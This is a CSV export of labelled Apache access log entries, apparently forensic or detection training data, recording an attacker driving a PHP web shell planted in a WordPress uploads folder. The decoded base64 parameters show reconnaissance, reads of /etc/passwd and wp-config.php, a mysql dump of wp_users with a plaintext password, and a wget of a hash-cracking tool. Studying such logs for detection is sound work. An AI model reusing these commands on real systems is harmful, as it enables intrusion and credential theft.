event_id,datetime,timestamp_desc,source,source_long,message,parser,display_name,tag,normalized,actor,decoded,label_candidates,label_predict
11,2022-01-18T12:38:00.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,HTTP Request with Suspicious User Agent[medium],HTTP Request with Suspicious User Agent[medium]
12,2022-01-18T12:38:01.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,HTTP Request with Suspicious User Agent[medium],HTTP Request with Suspicious User Agent[medium]
13,2022-01-18T12:38:04.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""id""]]",HTTP Request with Suspicious User Agent[medium] | Sysinfo Commands in HTTP Request[high],Sysinfo Commands in HTTP Request[high]
14,2022-01-18T12:38:06.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""netstat"", ""-t""]]",HTTP Request with Suspicious User Agent[medium] | Network Commands in HTTP Request[high],Network Commands in HTTP Request[high]
15,2022-01-18T12:38:08.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/resolv.conf""]]",HTTP Request with Suspicious User Agent[medium] | File Read Commands in HTTP Request[high],File Read Commands in HTTP Request[high]
16,2022-01-18T12:38:09.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ip"", ""addr""]]",HTTP Request with Suspicious User Agent[medium] | Network Commands in HTTP Request[high],Network Commands in HTTP Request[high]
17,2022-01-18T12:38:11.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJwcyIsICItQSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ps"", ""-A""]]",HTTP Request with Suspicious User Agent[medium] | Process Commands in HTTP Request[high],Process Commands in HTTP Request[high]
18,2022-01-18T12:38:14.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJsc2JfcmVsZWFzZSIsICItYSJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""lsb_release"", ""-a""]]",HTTP Request with Suspicious User Agent[medium] | Filesystem Commands in HTTP Request[high] | Sysinfo Commands in HTTP Request[high],Filesystem Commands in HTTP Request[high]
19,2022-01-18T12:38:16.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9ncm91cCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/group""]]",Local File Inclusion[high] | HTTP Request with Suspicious User Agent[medium] | File Read Commands in HTTP Request[high],Local File Inclusion[high]
20,2022-01-18T12:38:17.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wYXNzd2QiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/passwd""]]",Local File Inclusion[high] | HTTP Request with Suspicious User Agent[medium] | File Read Commands in HTTP Request[high],Local File Inclusion[high]
21,2022-01-18T12:38:19.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJkYXRlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""date""]]",HTTP Request with Suspicious User Agent[medium] | Time-Temporal Information Commands in HTTP Request[high],Time-Temporal Information Commands in HTTP Request[high]
22,2022-01-18T12:38:21.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJscyIsICItbGFSIiwgIi92YXIvd3d3Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""ls"", ""-laR"", ""/var/www""]]",HTTP Request with Suspicious User Agent[medium] | Filesystem Commands in HTTP Request[high],Filesystem Commands in HTTP Request[high]
23,2022-01-18T12:38:23.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/var/www/intranet.price.fox.org/wp-config.php""]]",HTTP Request with Suspicious User Agent[medium] | File Read Commands in HTTP Request[high],File Read Commands in HTTP Request[high]
24,2022-01-18T12:38:25.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""mysql"", ""-u"", ""wordpress"", ""-ptainoox3aedeeSh"", ""wordpress_db"", ""-e"", ""\""select * from wp_users\""""]]",HTTP Request with Suspicious User Agent[medium] | Database Commands in HTTP Request[critical] | SQL Injection Strings In URI[high],Database Commands in HTTP Request[critical]
25,2022-01-18T12:38:27.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""cat"", ""/etc/profile""]]",HTTP Request with Suspicious User Agent[medium] | File Read Commands in HTTP Request[high],File Read Commands in HTTP Request[high]
26,2022-01-18T12:38:29.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1,172.17.130.196,"http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [""wget"", ""https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz""]]",HTTP Request with Suspicious User Agent[medium] | File Resource Commands in HTTP Request[high],File Resource Commands in HTTP Request[high]
27,2022-01-18T12:38:32.000000+00:00,Recorded Time,LOG,Apache Access Log,http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1,text/apache_access,OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2,-,http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1,10.35.35.118,http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1,HTTP Request with Suspicious User Agent[medium],HTTP Request with Suspicious User Agent[medium]
